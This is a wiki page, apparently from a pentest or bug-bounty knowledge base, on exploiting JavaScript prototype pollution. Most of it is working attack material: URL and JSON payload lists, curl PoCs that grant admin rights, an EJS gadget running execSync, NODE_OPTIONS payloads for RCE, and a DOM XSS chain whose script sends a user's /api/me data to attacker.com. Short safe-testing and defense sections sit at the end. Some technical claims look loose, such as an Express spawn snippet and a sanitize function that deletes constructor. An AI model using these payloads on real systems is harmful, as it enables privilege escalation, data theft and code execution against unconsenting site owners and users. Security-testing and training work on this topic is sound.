---
type: wiki
category: attack
tool: dom-invader,manual
status: active
last-updated: 2026-04-21
---

# Prototype Pollution (Client-side + Server-side)

> **Use case:** Every JavaScript Object shares `Object.prototype`. If you can pollute it, every `{}` site-wide inherits the attacker's property → DOM XSS / RCE / auth bypass.
> One of PortSwigger's Top 10 in recent years; Parse Server / Prisma / Kibana / lodash have all had major CVEs.

## 0. Principle

```javascript
// client-side prototype pollution
Object.prototype.isAdmin = true;

const user = {};
console.log(user.isAdmin);  // → true (inherited via the prototype)

// any subsequent {} inherits it too
const order = {};
console.log(order.isAdmin);  // → true
```

Pollution vectors:
- **Client-side**: URL query (`?__proto__[x]=1`) → merged into a config object
- **Server-side**: `lodash.merge(target, JSON.parse(req.body))`, Express query parser
- **Gadget**: after pollution, the application's **normal code path** triggers a bug because of the new property (XSS sink / `eval` / `spawnSync`)

## 1. Client-side Prototype Pollution (Client-side PP)

### 1.1 Common pollution sources

```
URL query:
  https://target.com/#__proto__[x]=attacker

JSON.parse (if it parses the hash / localStorage):
  {"__proto__": {"x": "attacker"}}

History.state / postMessage
```

### 1.2 Common sinks (Gadgets) → XSS

Many JS libraries read an "unset" property during initialization; if that property has been polluted → it takes a dangerous branch.

**jQuery `html()` → script execution:**

```javascript
// jQuery checks options.html to take the html branch
$.extend(true, {}, JSON.parse(hash));
$('<div>', options).appendTo('body');
// if options.html has a value → innerHTML
```

Pollution:
```
https://target.com/#__proto__[html]=<img src=x onerror=alert(1)>
```

**AngularJS `ng-include`:**

```
https://target.com/#__proto__[template][url]=https://evil.com/xss.html
```

**EJS template injection:**

```
https://target.com/?__proto__[client]=true&__proto__[escapeFunction]=JSON.stringify;process.mainModule.require('child_process').execSync('id')
```

### 1.3 Detection: DOM Invader

```
1. Install Burp Browser → bottom-right "DOM Invader"
2. Enable Prototype Pollution
3. Navigate to the target → DOM Invader auto-fuzzes __proto__, constructor.prototype
4. Check "Pollutions detected" + any possible gadget
```

Burp Pro exclusive, extremely efficient.

### 1.4 Manual detection

Chrome devtools:

```javascript
// first print Object.prototype in the console to check for existing abnormal properties
Object.keys(Object.prototype)
// → empty = normal

// try polluting
// URL: #__proto__[test]=polluted
// reload, then check:
Object.prototype.test
// → "polluted" → vulnerable
```

### 1.5 Gadget database

https://github.com/BlackFan/client-side-prototype-pollution/tree/master/gadgets

Contains known gadgets for 30+ libraries including jQuery / AngularJS / Vue / Bootstrap / Webpack / Next.js / html5lib, each with a PoC URL.

## 2. Server-side Prototype Pollution (Server-side PP)

### 2.1 Typical vulnerable merge functions

```javascript
// dangerous
lodash.merge(target, userInput)
lodash.set(target, key, val)
_.defaultsDeep(target, userInput)
Object.assign(target, userInput)  // shallow copy, but writing target[__proto__] directly still works
$.extend(true, target, userInput)  // deep extend
```

If `__proto__` or `constructor.prototype` is used as a key → it writes directly to Object.prototype.

### 2.2 Classic Express body-parser pattern

```javascript
app.post('/api/user', (req, res) => {
  const user = {};
  Object.assign(user, req.body);   // if req.body contains __proto__ → pollution
  // or
  _.merge(user, req.body);
});
```

PoC:
```bash
curl -X POST https://target.com/api/user \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'

# next request
curl https://target.com/api/me -H "Authorization: Bearer $TOKEN"
# → returns {"admin":true}  ← the entire process's Objects have been polluted
```

### 2.3 Server-side gadget → RCE

Node.js spawning child_process:
```javascript
// express.js source code
options = options || {};       // ← if Object.prototype.shell = '/bin/sh'
spawn('ls', [], options);
```

Pollute `Object.prototype.shell = 'id;'` → every spawn call gets injected.

PortSwigger lab example:
```bash
curl -X PUT https://target/api/user \
  -d '{"__proto__":{"NODE_OPTIONS":"--require /tmp/exploit.js"}}'
# next time the server forks a child process, NODE_OPTIONS gets read → requires the attacker's file
```

### 2.4 Known CVE list

| Package | CVE | Payload |
|---------|-----|---------|
| lodash ≤ 4.17.11 | CVE-2019-10744 | `_.defaultsDeep(target, {"__proto__":{"a":1}})` |
| lodash.set ≤ 4.3.2 | CVE-2020-8203 | `_.set(obj, '__proto__.x', 1)` |
| hoek ≤ 4.2.0 | CVE-2018-3728 | same pattern |
| merge ≤ 2.1.0 | CVE-2018-16469 | same |
| mixin-deep ≤ 1.3.1 | CVE-2019-10746 | same |
| immer < 9.0.6 | CVE-2021-23436 | produce pattern |
| Parse Server | CVE-2022-24760 | `_wperm` via MongoDB op |
| Prototype pollution in nuxt.js | CVE-2020-7753 | |
| Kibana | CVE-2019-7609 | |

## 3. Detecting Server-side PP

### 3.1 State pollution test

```bash
# send the pollution payload
curl -X POST https://target.com/api/x \
  -d '{"__proto__":{"testFingerprint42":"polluted"}}'

# send a normal request afterward
curl https://target.com/api/any-endpoint

# if testFingerprint42 shows up in the response → pollution succeeded
```

### 3.2 Blind probe via status code diff

Many frameworks read Object.prototype to decide behavior. Polluting something like `Object.prototype.status = 510` and seeing subsequent responses' status codes change proves it.

```bash
# James Kettle's server-side PP research has dedicated charset / ignoreUnknown techniques
```

### 3.3 Nuclei template

Unofficial templates exist, but detection is unreliable. Manual testing is fastest.

### 3.4 DOMPurify + PP testing tools

```bash
# Server-Side-Prototype-Pollution-Gadgets-Scanner
npm install -g server-side-prototype-pollution-scanner
ssppscan https://target.com
```

## 4. Real-world PoC: Authenticated admin via PP

Target: Express API

### Step 1: Find a merge entry point
Commonly found at:
- `POST /api/user/profile` update
- `PUT /api/settings`
- `PATCH /api/config`

### Step 2: Send the pollution payload
```bash
curl -X PATCH https://target.com/api/user/profile \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","__proto__":{"isAdmin":true,"role":"admin"}}'
```

### Step 3: Verify the pollution took effect
```bash
# use your own normal user token
curl https://target.com/api/admin/users \
  -H "Authorization: Bearer $USER_TOKEN"
# should originally be 403; if it's now 200 → PP succeeded and the admin check reads from the prototype
```

### Step 4: Expand impact
```bash
# full access to the admin panel
# check whether you can spawn a child process (requires a server-side sink)
```

## 5. Client-side PP real-world PoC: DOM XSS

Target: a legacy SPA using jQuery

### Step 1: URL hash pollution
```
https://target.com/#__proto__[src]=https://evil.com/xss.js
```

### Step 2: on page load → jQuery reads the undefined option `.src` → innerHTML → script loads

### Step 3: XSS payload
```javascript
// https://evil.com/xss.js
fetch('/api/me').then(r=>r.json()).then(d=>{
  fetch('https://attacker.com/?c='+btoa(JSON.stringify(d)))
});
```

## 6. Common test payload list

### URL-based (client)

```
?__proto__[polluted]=1
?__proto__.polluted=1
?constructor[prototype][polluted]=1
?constructor.prototype.polluted=1
?constructor[prototype][innerHTML]=<svg+onload=alert(1)>
?__proto__[template][url]=//evil.com/x
?__proto__[div][html]=<img+src+onerror=alert(1)>
?__proto__[html]=<img+src+onerror=alert(1)>
?__proto__[sanitize]=false
```

### JSON body (server)

```json
{"__proto__":{"polluted":"yes"}}
{"__proto__":{"isAdmin":true}}
{"__proto__":{"toString":{"constructor":{"constructor":"return process"}}}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"__proto__":{"shell":"/bin/sh"}}
{"__proto__":{"NODE_OPTIONS":"--require /tmp/x.js"}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x.js"}}}
{"__proto__":{"argv0":"node"}}
```

## 7. Report template

```markdown
## Vulnerability Summary
https://target.com/api/user/update uses `lodash.merge` to merge user input into the user
object, without disabling the `__proto__` key, resulting in server-side prototype
pollution. After polluting `Object.prototype.isAdmin = true`, every subsequent user is
judged as admin during authorization checks, resulting in a complete privilege bypass.

## Reproduction Steps

### Step 1: Confirm a normal user has no admin privileges
curl https://target.com/api/admin/users -H "Authorization: Bearer $USER_TOKEN"
→ 403

### Step 2: Pollute
curl -X PATCH https://target.com/api/user/update \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"x","__proto__":{"isAdmin":true}}'
→ 200

### Step 3: Verify the pollution took effect
curl https://target.com/api/admin/users -H "Authorization: Bearer $USER_TOKEN"
→ 200 [...all users...]

### Step 4: Confirm it's global (other users are affected too)
[test with a second account, the same prototype pollution persists]

## Impact
- Any normal user can gain admin privileges
- The pollution is process-wide — every request is affected until the server restarts
- Further gadgets could reach RCE (child_process spawn NODE_OPTIONS)

## Severity
P1 / Critical
```

## 8. Safe testing rules

1. ⚠️ **Server-side PP is process-global** — pollution affects every user
2. ✅ Test with a harmless key first (`__proto__[testFingerprint]=1`) to confirm pollution
3. ❌ Don't leave the pollution in place for an extended period in production (it affects real users)
4. ✅ Notify the program's ops team immediately after testing to restart the process
5. ✅ Include cleanup notes in the PoC

## 9. Defense angle

```javascript
// forbid the __proto__ key
function sanitize(obj) {
  if (obj.__proto__) delete obj.__proto__;
  if (obj.constructor) delete obj.constructor;
  return obj;
}

// or use Object.create(null)
const safe = Object.create(null);
Object.assign(safe, userInput);

// or JSON schema validation
// or use a newer lodash version (≥ 4.17.21)
// or enable Node.js's --disable-proto=delete
```

## Related files

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) § NoSQLi / JSON
- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) § 7 hardcoded client_secret
- PortSwigger PP Lab: https://portswigger.net/web-security/prototype-pollution
- Client-Side PP Gadgets DB: https://github.com/BlackFan/client-side-prototype-pollution
- Server-Side PP Scanner: https://github.com/yuske/server-side-prototype-pollution
- James Kettle Server-Side PP: https://portswigger.net/research/server-side-prototype-pollution
